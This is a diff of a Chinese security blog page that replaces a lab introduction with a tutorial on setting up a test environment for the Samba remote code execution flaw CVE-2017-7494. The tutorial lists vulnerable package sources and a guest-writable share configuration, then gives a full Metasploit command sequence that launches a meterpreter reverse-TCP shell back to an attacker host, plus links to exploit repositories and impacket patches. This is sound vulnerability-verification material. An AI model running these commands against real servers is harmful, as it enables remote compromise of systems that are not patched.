@@ -12,36 +12,36 @@
         }
     }
   </script>
-  <title>天御实验室 - Zer0d0y(段公子)&#39;s Blog</title>
+  <title>搭建漏洞利用测试环境 - Zer0d0y(段公子)&#39;s Blog</title>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
 <meta name="keywords" content="xxx,">
-<meta name="description" content="实验室方向： 前沿安全攻防技术研究（主流操作系统、互联网和移动互联网应用、云计算技术及物联网设备） 实验室使命： ***** 用未来技术服务现在 ***** 实验室成员">
+<meta name="description" content="TL;DR - 快速搭建漏洞利用测试环境，进行漏洞验证。本文以Samba远程代码执行漏洞(CVE-2017-7494)为例 1.Samba CVE-2017-7494 漏洞概述 2017年5月24">
 <meta name="author" content="Zer0d0y">
 <meta name="publisher" content="Zer0d0y">
 <meta name="generator" content="http://gohugo.io/"/>
 
-<meta itemprop="name" content="天御实验室 - Zer0d0y(段公子)&#39;s Blog">
-<meta itemprop="description" content="实验室方向： 前沿安全攻防技术研究（主流操作系统、互联网和移动互联网应用、云计算技术及物联网设备） 实验室使命： ***** 用未来技术服务现在 ***** 实验室成员">
+<meta itemprop="name" content="搭建漏洞利用测试环境 - Zer0d0y(段公子)&#39;s Blog">
+<meta itemprop="description" content="TL;DR - 快速搭建漏洞利用测试环境，进行漏洞验证。本文以Samba远程代码执行漏洞(CVE-2017-7494)为例 1.Samba CVE-2017-7494 漏洞概述 2017年5月24">
 <meta itemprop="image" content="https://www.zer0d0y.info/public/coderzh.jpg">
 
-<meta property="og:title" content="天御实验室 - Zer0d0y(段公子)&#39;s Blog" />
+<meta property="og:title" content="搭建漏洞利用测试环境 - Zer0d0y(段公子)&#39;s Blog" />
 <meta property="og:type" content="article" />
-<meta property="og:url" content="https://www.zer0d0y.info/post/01sec-Tlab/" />
+<meta property="og:url" content="https://www.zer0d0y.info/post/notes-on-bug-hunting-labs/" />
 <meta property="og:image" content="https://www.zer0d0y.info/public/coderzh.jpg" />
-<meta property="og:description" content="实验室方向： 前沿安全攻防技术研究（主流操作系统、互联网和移动互联网应用、云计算技术及物联网设备） 实验室使命： ***** 用未来技术服务现在 ***** 实验室成员">
+<meta property="og:description" content="TL;DR - 快速搭建漏洞利用测试环境，进行漏洞验证。本文以Samba远程代码执行漏洞(CVE-2017-7494)为例 1.Samba CVE-2017-7494 漏洞概述 2017年5月24">
 
 <meta name="twitter:card" content="summary">
 <meta name="twitter:site" content="@Zer0d0y">
-<meta name="twitter:title" content="天御实验室 - Zer0d0y(段公子)&#39;s Blog">
-<meta name="twitter:description" content="实验室方向： 前沿安全攻防技术研究（主流操作系统、互联网和移动互联网应用、云计算技术及物联网设备） 实验室使命： ***** 用未来技术服务现在 ***** 实验室成员">
+<meta name="twitter:title" content="搭建漏洞利用测试环境 - Zer0d0y(段公子)&#39;s Blog">
+<meta name="twitter:description" content="TL;DR - 快速搭建漏洞利用测试环境，进行漏洞验证。本文以Samba远程代码执行漏洞(CVE-2017-7494)为例 1.Samba CVE-2017-7494 漏洞概述 2017年5月24">
 <meta name="twitter:creator" content="@Zer0d0y">
 <meta name="twitter:image" content="https://www.zer0d0y.info/public/coderzh.jpg">
 
   <script>document.documentElement.className = document.documentElement.className.replace("no-js", "js");</script>
-  <link rel="canonical" href="https://www.zer0d0y.info/post/01sec-Tlab/">
-  <link rel='shortlink' href="https://www.zer0d0y.info/post/01sec-Tlab/"/>
+  <link rel="canonical" href="https://www.zer0d0y.info/post/notes-on-bug-hunting-labs/">
+  <link rel='shortlink' href="https://www.zer0d0y.info/post/notes-on-bug-hunting-labs/"/>
   <link rel="shortcut icon" href="https://www.zer0d0y.info/public/favicon.ico"/>
   
 <link rel="stylesheet" id="human-style-css" href="https://www.Zer0d0y.info/wp-content/themes/hueman/style.css" type="text/css" media="all"/>
@@ -175,7 +175,7 @@
               <ul class="meta-single group">
                 
                 <li class="category">
-                  <a href="https://www.Zer0d0y.info/categories/%E6%AE%B5%E5%85%AC%E5%AD%90/" rel="category tag">段公子</a>
+                  <a href="https://www.Zer0d0y.info/categories/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/" rel="category tag">安全研究</a>
                 </li>
                 
               </ul>
@@ -187,12 +187,12 @@
                   class="post type-post status-publish format-standard has-post-thumbnail hentry category-australien tag-bondi-beach tag-city2surf tag-sydney">
                 <div class="post-inner group">
 
-                  <h1 class="post-title">天御实验室</h1>
+                  <h1 class="post-title">搭建漏洞利用测试环境</h1>
 
                   <p class="post-byline">
-                    by  · 2017年05月04日 · 164 Words ·
-                    ~1min reading time |
-                    <a href="https://github.com/Zer0d0y/Zer0d0y.github.io/master/content/post/01sec-Tlab.md"
+                    by  · 2017年07月30日 · 620 Words ·
+                    ~2min reading time |
+                    <a href="https://github.com/Zer0d0y/Zer0d0y.github.io/master/content/post/notes-on-bug-hunting-labs.md"
                        target="_blank">Improve on <i class="fa fa-github"></i></a>
                   </p>
 
@@ -206,7 +206,7 @@
 
 <figure >
     
-        <img src="images/Tlab.jpeg" />
+        <img src="images/bug-hunting-labs.png" />
     
     
 </figure>
@@ -216,30 +216,138 @@
 <caption align="bottom"> </caption>
 </table>
 
-<h5 id="实验室方向">实验室方向：</h5>
-
-<pre><code>前沿安全攻防技术研究（主流操作系统、互联网和移动互联网应用、云计算技术及物联网设备）
+<pre><code>TL;DR - 快速搭建漏洞利用测试环境，进行漏洞验证。本文以Samba远程代码执行漏洞(CVE-2017-7494)为例
 </code></pre>
 
-<h5 id="实验室使命">实验室使命：</h5>
+<h5 id="1-samba-cve-2017-7494-漏洞概述">1.Samba CVE-2017-7494 漏洞概述</h5>
 
-<pre><code>***** 用未来技术服务现在 *****
+<pre><code>2017年5月24日Samba发布了4.6.4版本，中间修复了一个严重的远程代码执行漏洞，漏洞编号CVE-2017-7494，漏洞影响了Samba 3.5.0 之后到4.6.4/4.5.10/4.4.14中间的所有版本。
 </code></pre>
 
-<h5 id="实验室成员要求">实验室成员要求：</h5>
+<h5 id="2-环境介绍">2.环境介绍</h5>
 
-<pre><code>1.认同并理解工程师文化，认同并理解OKR（Google），富有激情.
+<pre><code>攻击者操作系统：
+Kali linux 2017.1(kali-rolling)
 
-3.有软件工程研发经验，对（信息）安全有自己的理解.
+目标操作系统：
+Ubuntu 16.04.2 LTS
 
-3.精通安全攻防技术.
+漏洞软件包版本：
+samba 2:4.3.11+dfsg-0ubuntu0.16.04.6
 
-4.某个领域或几个领域顶级专家.
+漏洞软件包下载地址：
+https://launchpad.net/~ubuntu-security-proposed/+archive/ubuntu/ppa/+build/12371197
+https://github.com/Zer0d0y/Samba-CVE-2017-7494/blob/master/Samba_CVE-2017-7494_pkgs.tar.gz
 </code></pre>
 
-<h5 id="天御实验室">天御实验室</h5>
+<h5 id="3-samba配置">3.Samba配置</h5>
 
-<p><a href="https://www.01sec.blog/">https://www.01sec.blog/</a></p>
+<pre><code># Samba配置
+vi /etc/samba/smb.conf
+# 在文件最后添加如下内容
+[public]
+path = /share
+public = yes
+writable = yes
+guest ok = yes
+
+# 创建目录、设置权限、重启服务
+mkdir /share
+chown nobody:nogroup /share/
+/etc/init.d/smbd restart
+</code></pre>
+
+<h5 id="4-漏洞利用-metasploit">4.漏洞利用（metasploit）</h5>
+
+<pre><code>msfconsole
+use exploit/linux/samba/is_known_pipename
+set RHOST 192.168.8.95
+show targets
+set target 3
+set payload linux/x64/meterpreter/reverse_tcp
+set LHOST 192.168.8.82
+set LPORT 51000
+show options
+exploit
+</code></pre>
+
+<h5 id="5-安装老版本软件包-ubuntu-和-centos-进行漏洞验证">5.安装老版本软件包（Ubuntu 和 CentOS）进行漏洞验证</h5>
+
+<pre><code># Ubuntu
+方法一.通过launchpad下载
+https://launchpad.net/ubuntu/版本代号/+source/软件包名
+
+举例：Ubuntu 16.04 xenial
+https://launchpad.net/ubuntu/xenial/+source/samba
+选择相关版本：
+https://launchpad.net/ubuntu/+source/samba/2:4.3.11+dfsg-0ubuntu0.16.04.6
+选择平台：Builds ---&gt; amd64
+https://launchpad.net/~ubuntu-security-proposed/+archive/ubuntu/ppa/+build/12371197
+下载所需软件包：
+dpkg -l | grep samba | cut -d' ' -f3
+wget xxx.deb
+
+# CentOS
+方法一.
+yum --showduplicates list samba
+
+方法二.
+http://vault.centos.org/6.0/os/x86_64/Packages/
+http://vault.centos.org/6.0/os/SRPMS/Packages/ or http://ftp.redhat.com/redhat/linux/enterprise/6Server/en/os/SRPMS/
+http://rpm.pbone.net/
+</code></pre>
+
+<h5 id="6-查看软件包修复了哪些bug-漏洞">6.查看软件包修复了哪些Bug（#漏洞）</h5>
+
+<pre><code># Ubuntu
+apt changelog samba
+
+# CentOS
+rpm -qa samba --changelog | head
+yum install yum-plugin-changelog
+yum changelog 1 samba | less
+</code></pre>
+
+<h5 id="7-samba-cve-2017-7494-on-centos-6-5">7.Samba CVE-2017-7494 on CentOS 6.5</h5>
+
+<pre><code># 安装老版本Samba
+yum --showduplicates list samba
+yum remove samba-*
+yum install samba-3.6.23-41.el6
+setenforce 0
+
+# 配置Samba
+vi /etc/samba/smb.conf
+[global]
+workgroup = WORKGROUP
+server string = 23 Samba Server Version %v
+netbios name = jsamba
+log file = /var/log/samba/log.%m
+
+security = share
+[public]
+path = /share
+public = yes
+writable = yes
+guest ok = yes
+
+mkdir /share
+chown nobody:nobody /share -R
+/etc/init.d/smb restart
+</code></pre>
+
+<h5 id="附录-samba-cve-2017-7494-漏洞利用工具">附录：Samba CVE-2017-7494 漏洞利用工具</h5>
+
+<p><a href="https://github.com/joxeankoret/CVE-2017-7494">https://github.com/joxeankoret/CVE-2017-7494</a><br />
+<a href="https://github.com/CoreSecurity/impacket/blob/master/examples/sambaPipe.py">https://github.com/CoreSecurity/impacket/blob/master/examples/sambaPipe.py</a><br />
+<a href="https://github.com/opsxcq/exploit-CVE-2017-7494">https://github.com/opsxcq/exploit-CVE-2017-7494</a><br />
+<a href="https://github.com/omri9741/cve-2017-7494">https://github.com/omri9741/cve-2017-7494</a></p>
+
+<pre><code># Notes on CoreSecurity impacket
+修改文件impacket/smb3.py
+# 行925 注释掉 fileName = string.replace(fileName, '/', '\\')
+# 行927 注释掉 fileName = ntpath.normpath(fileName)
+</code></pre>
 
                       
 <div class="bdsharebuttonbox">
@@ -280,7 +388,7 @@
                         <div>
                             <p style="margin-top:0px;">作者：<a target="_blank" href="http://www.Zer0d0y.info/">Zer0d0y</a>
                             <br />微信关注：Zer0d0y
-                            <br />本文出处：<a target="_blank" href="https://www.zer0d0y.info/post/01sec-Tlab/">https://www.zer0d0y.info/post/01sec-Tlab/</a>
+                            <br />本文出处：<a target="_blank" href="https://www.zer0d0y.info/post/notes-on-bug-hunting-labs/">https://www.zer0d0y.info/post/notes-on-bug-hunting-labs/</a>
                             <br />
                             本站评论使用Disqus，如果长时间无法加载，请切换至“自由”互联网。
                             <br />文章版权归本人所有，欢迎转载，但未经作者同意必须保留此段声明，且在文章页面明显位置给出原文连接，否则保留追究法律责任的权利。 </p>
@@ -335,20 +443,14 @@
     <ul class="post-nav group">
       <li class="next">
         
-        <a href="https://www.zer0d0y.info/post/Goal-Science-Thinking/" rel="next">
+        <a href="https://www.zer0d0y.info/post/01sec-Tlab/" rel="next">
           <i class="fa fa-chevron-right"></i>
           <strong>Next post</strong>
-          <span>Goal Science Thinking（目标科学思维）</span>
+          <span>天御实验室</span>
         </a>
         
       </li>
       <li class="previous">
-        
-        <a href="https://www.zer0d0y.info/post/notes-on-bug-hunting-labs/" rel="prev">
-          <i class="fa fa-chevron-left"></i>
-          <strong>Previous Post</strong>
-          <span>搭建漏洞利用测试环境</span>
-        </a>
         
       </li>
     </ul>
